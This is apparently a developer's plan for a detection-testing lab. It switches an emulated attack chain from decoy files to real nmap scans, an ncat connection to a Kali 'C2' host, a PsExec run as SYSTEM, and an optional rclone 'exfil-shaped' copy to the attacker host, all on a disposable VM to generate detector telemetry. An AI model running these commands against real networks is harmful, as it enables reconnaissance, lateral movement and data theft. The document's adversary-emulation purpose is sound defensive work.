# Plan: real tool download + execution in the T1105 phase

Written 2026-11-04 (implement next session). Branch: `provision-kali-ansible`.
Decision (user, 2026-11-04): **download + RUN genuinely-real but benign tools** (nmap / ncat /
PsExec; rclone optional). No mimikatz / credential-theft malware.

## Why (the honest point — read first)

Today the T1105 phase (`src/atomic-attack-pack/scenarios/rce-killchain.ps1:138-150`) downloads files
*named* like hacker tools (`mimikatz/psexec/nc/nmap/rclone.exe`) but the Kali stage serves **inert
marker text**, not real binaries (`tools/launch_exploit.py:43,47,127`), and nothing is executed.

Swapping inert files for REAL binaries adds **zero** detector signal: the graph keys FILE nodes by a
hash of the path and NET nodes by `ip:port` hash (CLAUDE.md section 9); file *content* is not a feature.
A real `mimikatz.exe` at the same path = the same FILE node as the marker.

The ONLY thing that raises the subgraph score is **executing** the tools: a real nmap/ncat/PsExec run
spawns real child processes and opens real sockets -> NEW unseen PROCESS + NET nodes (they are absent
from the idle baseline, so they flag). So this change is about **execution**, not file content. [OURS]

## Steps

### 1. Kali side -- host the real Windows binaries
- `src/ansible/roles/kali_attack/tasks/main.yml`: at provision (Kali has NAT/apt), `get_url` the
  **Windows** builds into `/opt/attack-pack/tools/win/` (gitignore it -- do NOT commit real binaries):
  - **nmap** zip -> extract `nmap.exe` + `ncat.exe` + their DLLs. Use **connect scan `-sT` only** so
    **no Npcap driver install** is needed.
  - **PsExec.exe** (Sysinternals PSTools zip; single signed exe).
  - **rclone.exe** (single static exe) -- optional.
  - Pin versions + checksums (ansible-idempotent-cloud-reruns memory: `force: no`, re-run changed=0).
- `src/atomic-attack-pack/tools/launch_exploit.py`: serve the real bytes from `tools/win/` at
  `/nmap.exe` etc. (replace the inert `TOOL_BYTES`/`TOOL_NAMES` marker loop). If a binary is missing,
  serve a clearly-labelled marker so the chain still runs. `--selftest` checks each served file
  non-empty (contacts no target).

### 2. Target side -- execute them (rce-killchain.ps1, T1105 phase ~line 138)
Run each **detached, with a timeout** so the chain never hangs:
- `nmap.exe -sT -p 22,80,443,445,3306,3389,8000 10.21.3.1-50 10.21.4.30` -- real `nmap.exe` process
  doing the connect sweep. **This replaces the hand-rolled TcpClient sweep (T1046).** FALLBACK: if
  nmap is missing/fails, keep the existing TcpClient sweep so the NET breadth signal survives.
- `ncat.exe <kali> 8080` (send one line) -- real `ncat.exe` process + socket to the C2.
- `PsExec.exe -accepteula -s cmd /c whoami` -- spawns `PsExec.exe -> PSEXESVC.exe -> cmd.exe` as
  SYSTEM: a real lateral-movement-shaped tree, none of it in the idle baseline -> all flag.
- (optional) `rclone.exe copy C:\Users\Public\tools <kali>` -- exfil-shaped transfer process.
- `-SelfTest` STAYS a pure dry run (no real scan/exec/download).
- Keep the script ASCII-only (Windows PowerShell 5.1 mis-parses no-BOM UTF-8 em-dashes via `-File`).

### 3. Cleanup (src/atomic-attack-pack/cleanup-all.ps1)
Kill lingering `nmap/ncat/PsExec/PSEXESVC/rclone`; remove the `PSEXESVC` service if PsExec left one;
keep the existing `C:\Users\Public\tools\` removal + `UpdaterSync` task + RCE shells.

### 4. Docs (honesty)
`SCENARIOS.md` phase/ATT&CK table + `manifest.json` indicators + `README.md` + `docs/DEVIATIONS.md`
D8: T1105 is now **real tools, executed**. Add process indicators
`nmap.exe/ncat.exe/PsExec.exe/PSEXESVC.exe/rclone.exe`. Record [OURS]: real benign tools *executed*
(signal = process/socket telemetry, not file content); lab-only (host-only subnet, Defender off,
disposable VM); no credential-theft malware.

### 5. Verify -> live
- `./selftest.sh`; `python3 -I tools/launch_exploit.py --selftest`.
- `ansible-playbook -i proxmox.ini kali.yml` (fetches binaries, deploys pack); confirm binaries land +
  serve + the chain runs on ws-etw (`-SelfTest` via WinRM, no pwsh on the control node).
- Live: keep ws-etw idle, launch just after a 5-min boundary
  `python3 -I /opt/attack-pack/tools/launch_exploit.py --target http://10.21.3.10:3000 --attack-seconds 180`;
  read the attack window in `/api/history` (flagged / subgraphs / max_sg_score / max_level / alert).
  Report red-or-not **as observed, not tuned**. Then `cleanup-all.ps1`; confirm idle returns green.
- Record the result in `docs/PROGRESS.md`.

## Risks / flags
- **Download dependency**: tool URLs/versions on Kali at provision time; pin + checksum.
- **Execution fragility**: real tools can fail/hang -> timeouts + detached launch + nmap->TcpClient
  fallback are mandatory.
- `PsExec -s` (SYSTEM) and real `nmap` are genuine offensive tooling; acceptable ONLY because the
  subnet is host-only, Defender is off, and the VM is disposable.
- Still [OURS] attack realism; disclosed in SCENARIOS/manifest/DEVIATIONS. Live result reported honestly.
